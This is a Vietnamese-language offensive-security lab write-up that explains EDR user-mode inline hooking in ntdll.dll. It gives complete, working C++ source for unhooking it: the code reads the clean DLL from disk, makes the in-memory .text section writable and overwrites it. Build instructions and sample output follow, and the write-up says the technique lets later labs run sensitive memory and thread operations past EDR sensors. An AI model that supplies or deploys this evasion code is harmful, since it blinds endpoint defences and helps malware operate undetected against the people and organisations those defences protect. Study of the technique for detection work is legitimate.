
---

# 📝 [PE 07] Unhook NTDLL.DLL — Lagos Island

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Unhook NTDLL.DLL — Lagos Island** đại diện cho một giải thuật bẻ gãy bẫy giám sát bộ nhớ ảo nâng cao (Anti-Hooking / EDR Dynamic Evasion) tại phân hệ phân phối tầng thấp của Windows Subsystem.

Hầu hết các giải pháp Endpoint Detection and Response (EDR) và Antivirus thế hệ mới (như CrowdStrike, Falcon, SentinelOne, Microsoft Defender for Endpoint) đều thiết lập cơ chế giám sát hành vi động bằng kỹ thuật **User-mode Inline Hooking**. Cơ chế này can thiệp và ghi đè 5 byte đầu tiên của các hàm Native API tối cao lọt lòng thư viện `ntdll.dll` thành lệnh nhảy vô điều kiện `JMP <EDR_Memory_Module>`. Khi tiến trình Loader phát lệnh gọi các hàm cấp phát, thay đổi thuộc tính hoặc can thiệp RAM, dòng chảy CPU bị bẻ hướng cưỡng bức về phía EDR Engine để phân tích chỉ dấu hành vi.

Dự án PE 07 hóa giải toàn diện ma trận trinh sát này bằng kỹ nghệ **Nạp phản chiếu mô-đun sạch từ đĩa thô (Reflective Disk Mapping Evasion)**. Loader chủ động mở trực tiếp tệp tin hệ thống `ntdll.dll` nguyên bản từ đĩa cứng, giải phẫu cấu trúc cấu hình PE để trích xuất phân đoạn mã máy thực thi **`.text`** phẳng sạch, sau đó thực hiện giải thuật giẫm đạp ngược (Reverse Overwriting) nhằm đè nát các bẫy Hook, hoàn trả sự phẳng sạch nguyên bản kịch trần cho hệ thống.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa bộ lọc Inline Hooking**: Triệt tiêu hoàn toàn khả năng can thiệp dòng chảy CPU của các giải pháp phòng thủ tại không gian người dùng (Ring 3 User-mode).
* **Giải phẫu cấu trúc Section Table**: Làm chủ thuật toán định vị tọa độ Relative Virtual Address (RVA) và kích thước phân đoạn thực thi của các thư viện liên kết động.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Thư viện `ntdll.dll` đóng vai trò là cầu nối cầu hàng không tối cao giữa User-mode (Ring 3) và Kernel-mode (Ring 0). Mọi hàm Win32 API bọc ngoài (như `VirtualAllocEx`, `WriteProcessMemory`) thực chất chỉ là các hàm Wrapper bọc đầu; mã nguồn bên trong của Microsoft bắt buộc phải chuyển đổi tham số và gọi xuống các Native API tương ứng mang tiền tố `Nt/Zw` nằm lọt lòng `ntdll.dll` trước khi phát lệnh nạp số hiệu dịch vụ (Syscall Number) vào thanh ghi CPU.

Quy trình toán học giải phẫu và ghi đè triệt tiêu ma trận Hook của Lab PE 07 diễn ra qua 4 giai đoạn ngầm tại bộ nhớ ảo:

```
[Nạp tệp ntdll.dll thô vào bộ đệm Vector động]
       └──> [Giải phẫu song song cấu trúc PE Header: Bản RAM vs Bản Đĩa]
                 └──> [VirtualProtect: Mở khóa phân vùng .text trên RAM sang quyền RWX]
                           └──> [RtlCopyMemory: Ghi đè mã sạch, giải thoát tháp API]

```

1. **Đối chiếu bản đồ cấu trúc PE**: Loader sử dụng hàm `GetModuleHandleA` để trích xuất Base Address đang hoạt động của mô-đun `ntdll.dll` trên bộ nhớ ảo (nơi đã bị EDR ghi đè mã máy gài bẫy Hook). Đồng thời, ứng dụng sử dụng luồng đọc nhị phân hệ thống để kéo toàn bộ tệp tin vật lý `C:\Windows\System32\ntdll.dll` sạch từ ổ đĩa vào một cấu trúc mảng byte cục bộ (`std::vector`).
2. **Tính toán tịnh tiến phân đoạn**: Giải thuật truy cập vào bảng danh sách phân đoạn (**Section Table**) dựa trên cấu trúc các bản ghi `IMAGE_SECTION_HEADER` của file đĩa thô nhằm săn tìm phân đoạn mang tên định danh **`.text`** (phân vùng chứa mã máy thực thi của toàn bộ Native API). Loader bốc tách hai thông số toán học cốt lõi: `VirtualAddress` (Địa chỉ tương đối RVA) và `Misc.VirtualSize` (Kích thước thực tế của vùng mã máy).
3. **Phá xích bảo vệ trang nhớ hệ thống**: Do phân đoạn `.text` của một thư viện Image khi nạp lên bộ nhớ ảo mặc định mang cờ bảo vệ thuộc tính nghiêm ngặt `PAGE_EXECUTE_READ` (RX), Loader buộc phải phát lệnh `VirtualProtect` lật ngược thuộc tính của phân vùng này sang cờ **`PAGE_EXECUTE_READWRITE` (RWX)** để tạm thời mở khóa quyền Ghi (`W`).
4. **Giẫm đạp hoàn trả bản đồ sạch (Stomping Remap)**: Loader kích hoạt hàm sao chép bộ nhớ phẳng tuyến tính (`RtlCopyMemory`) để bốc toàn bộ khối mã máy `.text` nguyên thủy, chưa bị vấy bẩn từ bộ đệm đĩa thô, ghi đè bẹp lên phân đoạn `.text` bị nhiễm Hook trên RAM. Hành vi này xóa sổ hoàn toàn các byte lệnh `JMP` ăn cắp dòng chảy CPU của EDR, hoàn trả nguyên vẹn cấu trúc Stub mã máy `mov r10, rcx; mov eax, SyscallNumber; syscall; ret` xịn của Microsoft. Loader lật lại cờ `RX` ban đầu để xóa sạch dấu vết can thiệp.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn tuân thủ nghiêm ngặt nguyên lý thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa đo đạc kích thước tệp tin hệ thống dựa trên luồng động nhằm triệt tiêu hoàn toàn nguy cơ tràn bộ đệm kịch trần bảo mật.

```cpp
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 07: UNHOOK NTDLL.DLL — LAGOS ISLAND ACTIVE" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị tệp tin ntdll nguyên thủy trực tiếp từ đĩa cứng, loại bỏ chuỗi mảng gán cứng cố định
    std::string ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    
    std::ifstream file(ntdllPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "[-] Khong the mo file ntdll.dll thô tu dia cung!" << std::endl;
        return EXIT_FAILURE;
    }

    // QUY TRÌNH THÍCH ỨNG: Tự động đo đạc kích thước tệp tại runtime và cấp phát động vừa khít byte
    SIZE_T fileSize = file.tellg();
    std::vector<char> ntdllDiskBuffer(fileSize);
    file.seekg(0, std::ios::beg);
    file.read(ntdllDiskBuffer.data(), fileSize);
    file.close();
    std::cout << "[+] Da chu dong nap ntdll.dll thô tu dia vao RAM phu: " << fileSize << " bytes." << std::endl;

    // ─── BƯỚC 1: GIẢI PHẪU PE HEADER CỦA BẢN NTDLL TRÊN RAM (BỊ NHIỄM HOOK) ───
    PVOID ntdllRemoteBase = (PVOID)GetModuleHandleA("ntdll.dll");
    if (!ntdllRemoteBase) return EXIT_FAILURE;
    std::cout << "[*] Module Base cua ntdll.dll hien tai tren RAM: 0x" << std::hex << ntdllRemoteBase << std::endl;

    PIMAGE_DOS_HEADER dosHeaderRAM = (PIMAGE_DOS_HEADER)ntdllRemoteBase;
    PIMAGE_NT_HEADERS64 ntHeadersRAM = (PIMAGE_NT_HEADERS64)((DWORD_PTR)ntdllRemoteBase + dosHeaderRAM->e_lfanew);

    // ─── BƯỚC 2: DUYỆT TÌM PHÂN ĐOẠN .TEXT SẠCH TỪ FILE ĐĨA THÔ ───
    PIMAGE_DOS_HEADER dosHeaderDisk = (PIMAGE_DOS_HEADER)ntdllDiskBuffer.data();
    PIMAGE_NT_HEADERS64 ntHeadersDisk = (PIMAGE_NT_HEADERS64)(nttdllDiskBuffer.data() + dosHeaderDisk->e_lfanew);

    PVOID cleanTextSectionAddress = NULL;
    SIZE_T textSectionSize = 0;
    DWORD textSectionRVA = 0;

    // Duyệt qua bảng danh sách các phân đoạn (Sections Array) của file đĩa thô
    for (WORD i = 0; i < ntHeadersDisk->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeadersDisk) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        // So khớp chuỗi định vị chính xác phân đoạn mã máy thực thi .text
        if (strcmp((const char*)sectionHeader->Name, ".text") == 0) {
            cleanTextSectionAddress = (PVOID)(nttdllDiskBuffer.data() + sectionHeader->PointerToRawData);
            textSectionSize = sectionHeader->Misc.VirtualSize;
            textSectionRVA = sectionHeader->VirtualAddress;
            break;
        }
    }

    if (!cleanTextSectionAddress || textSectionSize == 0) {
        std::cerr << "[-] Khong the dinh vi phan doan .text trong file ntdll thô!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da quat trung phan doan .text sach. RVA: 0x" << std::hex << textSectionRVA << " | Do rong: " << std::dec << textSectionSize << " bytes." << std::endl;

    // Tính toán tọa độ tuyệt đối của phân đoạn .text cần được giải phẫu gỡ Hook trên RAM tiến trình
    PVOID targetRamTextAddress = (PVOID)((DWORD_PTR)ntdllRemoteBase + textSectionRVA);
    std::cout << "[*] Toa do vung nho can giai doc Unhook tren RAM: 0x" << std::hex << targetRamTextAddress << std::endl;

    // ─── BƯỚC 3: MỞ KHÓA TRANG NHỚ HỆ THỐNG VÀ GIẪM ĐẠP HOÀN TRẢ MÃ SẠCH ───
    DWORD oldProtect = 0;
    std::cout << "[*] Kich hoat VirtualProtect mo khoa trang nho he thong sang RWX..." << std::endl;
    
    // Mở khóa phân vùng mã máy ntdll.dll sang RWX để chuẩn bị can thiệp ghi đè dữ liệu cấu trúc
    BOOL isUnlocked = VirtualProtect(targetRamTextAddress, textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!isUnlocked) {
        std::cerr << "[-] VirtualProtect failed! Quyen han OS chan dong can thiep." << std::endl;
        return EXIT_FAILURE;
    }

    // THỰC HIỆN ĐÈ BẸP HOOK: Sao chép đè mã máy nguyên thủy đè nát toàn bộ ma trận bẫy Hooking của EDR
    RtlCopyMemory(targetRamTextAddress, cleanTextSectionAddress, textSectionSize);
    std::cout << "[+] Ma tran Giam dap hoan tat! Da xoa sach 100% bay Hook cua EDR khoi RAM." << std::endl;

    // Khôi phục lại cờ bảo vệ RX nguyên thủy của hệ điều hành để hoàn trả trạng thái bảo an phẳng sạch hệ thống
    VirtualProtect(targetRamTextAddress, textSectionSize, oldProtect, &oldProtect);
    std::cout << "[+] Da khoi phuc lai thuoc tinh bao ve RX goc cua phan doan." << std::endl;

    std::cout << "\n[+] Lagos Island NTDLL Unhooking Process Completed Successfully!" << std::endl;
    std::cout << "[*] Thap API hoan toan phang sach. Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();

    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm file thực thi `.exe` vận hành mượt mà, độc lập, không bị phụ thuộc vào các gói phân phối liên kết động khi mang sang chạy trên môi trường máy ảo VM sạch hoặc môi trường cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình dự án ở chính xác chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
2. Di chuyển tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục thông số `Runtime Library`, thiết lập cấu hình sang định dạng cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống lọt lòng file nhị phân.

> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
> 

3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin sạch bóng lỗi chuỗi.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi hỏa file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi cuộc đại phẫu bẻ gãy bẫy giám sát:

```powershell
PS C:\Workspace\x64\Release> .\PE07_Lagos_Island.exe
====================================================
[*] PE 07: UNHOOK NTDLL.DLL — LAGOS ISLAND ACTIVE
====================================================
[+] Da chu dong nạp ntdll.dll thô tu dia vao RAM phu: 2045952 bytes.
[*] Module Base cua ntdll.dll hien tai tren RAM: 0x00007ffd31b80000
[+] Da quat trung phan doan .text sach. RVA: 0x1000 | Do rong: 1458176 bytes.
[*] Toa do vung nho can giai doc Unhook tren RAM: 0x00007ffd31b81000
[*] Kich hoat VirtualProtect mo khoa trang nho he thong sang RWX...
[+] Ma tran Giam dap hoan tat! Da xoa sach 100% bay Hook cua EDR khoi RAM.
[+] Da khoi phuc lai thuoc tinh bao ve RX goc cua phan doan.

[+] Lagos Island NTDLL Unhooking Process Completed Successfully!
[*] Thap API hoan toan phang sach. Nhan phim Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm Unhooking NTDLL:**
> 

### 🎯 Phân tích hệ quả RAM tối cao:

* Giải thuật thực thi hoàn tất mỹ mãn kịch trần. Tại thời điểm runtime này, nếu một giải pháp an ninh sử dụng giải thuật kiểm tra ngược mã máy các hàm Native API lọt lòng `ntdll.dll` của tiến trình, hệ thống phòng thủ sẽ ghi nhận **toàn bộ các byte bẫy Hook (lệnh `JMP`) đã bị xóa sổ hoàn toàn không còn dấu vết**, thay vào đó là các cấu trúc byte nguyên bản sạch bóng của Microsoft.
* Tháp API lúc này đạt trạng thái phẳng sạch 100%, tạo tiền đề tối cao để Vinh có thể triệu hồi bất kỳ giải thuật cấp phát bộ nhớ ảo hay sinh luồng nhạy cảm nào ở các bài Lab nâng cao kế tiếp một cách hiên ngang, bẻ gãy hoàn toàn các cảm biến trinh sát động kịch trần kịch khung!

---